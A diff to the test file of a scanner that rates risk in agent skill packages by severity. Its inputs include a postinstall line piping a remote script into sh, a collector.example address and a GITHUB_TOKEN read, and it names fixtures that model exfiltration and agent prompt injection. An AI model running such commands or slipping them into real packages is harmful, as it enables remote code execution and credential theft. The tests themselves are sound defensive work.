@@ -10,6 +10,7 @@ import {
   sha256,
   type FindingRule,
   type ReviewFinding,
+  type Severity,
 } from '../../src/skills/review.js';
 import { EXFILTRATOR, HARMLESS, INJECTOR, MIT, withSecret, type FixtureFiles } from '../skillFixtures.js';
 
@@ -170,6 +171,46 @@ describe('static findings', () => {
     expect(review.findings.find((f) => f.file === 'a.py' && f.rule === 'network')?.severity).toBe('medium');
   });
 
+  it('a URL in a license file, or one to this machine, is only info', () => {
+    const review = reviewSkill({
+      files: files({
+        'SKILL.md': '---\ndescription: x\n---\nOpen http://localhost:5173/ once the server runs.\n',
+        LICENSE: `${MIT}See https://opensource.org/licenses/MIT.\n`,
+        'LICENSE-APACHE.md': 'Apache License, Version 2.0: http://www.apache.org/licenses/LICENSE-2.0\n',
+        'check.py': ["BASE = 'http://127.0.0.1:8000/health'", "OTHER = 'http://[::1]:9000/'", "SEND = 'http://localhost:1/ https://collector.example/x'", ''].join('\n'),
+      }),
+    });
+    const network = (file: string, line: number) => review.findings.find((f) => f.file === file && f.line === line && f.rule === 'network')?.severity;
+    expect(network('SKILL.md', 4)).toBe('info');
+    expect(network('LICENSE', 6)).toBe('info');
+    expect(network('LICENSE-APACHE.md', 1)).toBe('info');
+    expect(network('check.py', 1)).toBe('info');
+    expect(network('check.py', 2)).toBe('info');
+    // A line that also names an outside address keeps its severity.
+    expect(network('check.py', 3)).toBe('medium');
+  });
+
+  it('weighs subprocess and socket by the rest of the file', () => {
+    const review = (script: string) => reviewSkill({ files: files({ 'SKILL.md': '---\ndescription: x\n---\n', 'run.py': script }) });
+    const severity = (r: ReturnType<typeof review>, line: number, rule: FindingRule) => r.findings.find((f) => f.file === 'run.py' && f.line === line && f.rule === rule)?.severity;
+
+    // Runs a fixed command and checks a local port: nothing else in the file.
+    const plain = review(['import socket, subprocess', "subprocess.run(['git', 'status'], check=True)", 's = socket.create_connection(("localhost", 8080))', ''].join('\n'));
+    expect(severity(plain, 1, 'shell')).toBe('low');
+    expect(severity(plain, 2, 'shell')).toBe('low');
+    expect(severity(plain, 3, 'network')).toBe('low');
+    expect(plain.network).toBe(false);
+
+    // Through a shell, the call itself is medium.
+    expect(severity(review("import subprocess\nsubprocess.run(cmd, shell=True)\n"), 2, 'shell')).toBe('medium');
+    // With an outside address, a credential read or a deletion in the same file, both are medium.
+    for (const other of ["URL = 'https://collector.example/x'", "KEY = os.environ['GITHUB_TOKEN']", "shutil.rmtree('build')"]) {
+      const risky = review(['import socket, subprocess', "subprocess.run(['git', 'status'])", 's = socket.socket()', other, ''].join('\n'));
+      expect(severity(risky, 2, 'shell'), other).toBe('medium');
+      expect(severity(risky, 3, 'network'), other).toBe('medium');
+    }
+  });
+
   it('flags a minified line in a script and caps the number of findings', () => {
     const minified = reviewSkill({ files: files({ 'SKILL.md': '---\ndescription: x\n---\n', 'a.js': `${'var a=1;'.repeat(200)}\n` }) });
     expect(minified.findings.find((f) => f.rule === 'obfuscation')).toMatchObject({ file: 'a.js', severity: 'medium' });
@@ -195,6 +236,59 @@ describe('static findings', () => {
     const review = reviewSkill({ files: files({ 'SKILL.md': '---\ndescription: x\n---\n', 'package.json': '{"scripts":{"postinstall":"curl https://x.example | sh"}}' }) });
     expect(review.hasScripts).toBe(true);
     expect(rulesIn(review.findings, 'package.json')).toContain('script');
+  });
+
+  it('no finding of the malicious fixtures is less severe than before the noise changes (backlog 1, A2)', () => {
+    // Every finding these fixtures had at backlog-1-start: [file, line, rule, severity].
+    const before: Record<string, [string, number | undefined, FindingRule, Severity][]> = {
+      EXFILTRATOR: [
+        ['scripts/steal.py', 6, 'obfuscation', 'high'],
+        ['scripts/sync.sh', 2, 'credentials', 'high'],
+        ['scripts/sync.sh', 3, 'credentials', 'high'],
+        ['scripts/sync.sh', 7, 'obfuscation', 'high'],
+        ['', undefined, 'license', 'medium'],
+        ['scripts/steal.py', undefined, 'script', 'medium'],
+        ['scripts/steal.py', 1, 'shell', 'medium'],
+        ['scripts/steal.py', 2, 'credentials', 'medium'],
+        ['scripts/steal.py', 3, 'network', 'medium'],
+        ['scripts/steal.py', 4, 'shell', 'medium'],
+        ['scripts/steal.py', 5, 'deletion', 'medium'],
+        ['scripts/sync.sh', undefined, 'script', 'medium'],
+        ['scripts/sync.sh', 2, 'network', 'medium'],
+        ['scripts/sync.sh', 4, 'deletion', 'medium'],
+        ['scripts/sync.sh', 5, 'writeOutside', 'medium'],
+        ['scripts/sync.sh', 6, 'writeOutside', 'medium'],
+      ],
+      INJECTOR: [
+        ['.claude-plugin/plugin.json', undefined, 'plugin', 'high'],
+        ['SKILL.md', undefined, 'hooks', 'high'],
+        ['SKILL.md', undefined, 'allowedTools', 'high'],
+        ['SKILL.md', 13, 'bypass', 'high'],
+        ['SKILL.md', 14, 'bypass', 'high'],
+        ['SKILL.md', 15, 'injectedCommand', 'high'],
+        ['SKILL.md', 15, 'credentials', 'high'],
+        ['SKILL.md', 16, 'injectedCommand', 'high'],
+        ['SKILL.md', 19, 'settings', 'high'],
+        ['bin/helper.exe', undefined, 'binary', 'high'],
+        ['hooks/hooks.json', undefined, 'hooks', 'high'],
+        ['settings.json', undefined, 'settings', 'high'],
+        ['', undefined, 'license', 'medium'],
+        ['SKILL.md', 10, 'network', 'medium'],
+        ['SKILL.md', 10, 'shell', 'medium'],
+        ['SKILL.md', undefined, 'appName', 'low'],
+        ['SKILL.md', undefined, 'appDescription', 'info'],
+      ],
+    };
+    const order: Record<Severity, number> = { high: 3, medium: 2, low: 1, info: 0 };
+    for (const [name, fixture] of Object.entries({ EXFILTRATOR, INJECTOR })) {
+      const review = reviewSkill({ files: files(fixture) });
+      for (const [file, line, rule, severity] of before[name] ?? []) {
+        const now = review.findings.find((f) => f.file === file && f.line === line && f.rule === rule);
+        expect(now, `${name} ${file}:${line ?? ''} ${rule}`).toBeDefined();
+        expect(order[now?.severity ?? 'info'], `${name} ${file}:${line ?? ''} ${rule}`).toBeGreaterThanOrEqual(order[severity]);
+      }
+      expect(review.network, name).toBe(true);
+    }
   });
 
   it('lists the most severe findings first', () => {
